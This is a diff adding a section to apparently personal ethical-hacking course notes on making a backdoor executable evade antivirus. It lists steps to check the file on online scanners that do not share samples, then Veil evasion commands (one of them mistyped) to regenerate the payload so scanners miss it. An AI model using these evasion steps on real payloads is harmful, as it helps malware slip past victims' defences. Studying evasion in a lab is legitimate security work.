@@ -90,9 +90,44 @@ NOTE !!! : THESE TWO OPTIONS ARE MANDATORY TO SET
 
 94. ByPassing AntiVirus Solutions
 ***
+NOTE !!! : THIS SECTION IS FOR ->
 
-1. 
+1. We are going to see whether our Backdoor file bypasses our anitvirus software or not ( means it fakes the 
+antivirus software without being caught )
 
+2. Go Google : Online Virus Scanner without result distribution
+   or Go : jotti.org ( But It shares the malware with the company of jotti however it works fine )
 
+3. You can upload your .exe file there
 
-   
+4. This gives you the results from different antivirus solutions like K7 , Kaspersky etc...
+
+5. Antivirus : Have algorithm that checks the pattern of virus and most of the times virus have same kind of pattern
+
+6. In order to change the pattern : 
+   GO : /opt/veil 
+   $ python3 Veil.py
+   # Goes for dashboard of Veil
+   $ list
+   $ evasion
+   $ set LHOST 10.0.2.15
+   $ set LHOST 8080
+   $ set PROCESSORS
+   $ set SLEEP 4
+   $ options # you can see the changes that is beng done over there
+   $ generate
+      # Enter the name for the .exe file( payload ) 
+      Tutor : lars_newpayload
+      # Hit enter
+
+   NOW THE FILE IS INSIDE THE usr/share/veil-output/compiled/file_name.exe
+
+   NOW GO jotti.org : upload this file and see the results
+
+   You can also change other program languages
+
+--------------------------------------------------------------------------------------
+
+95. Using Multi Handler
+***
+  
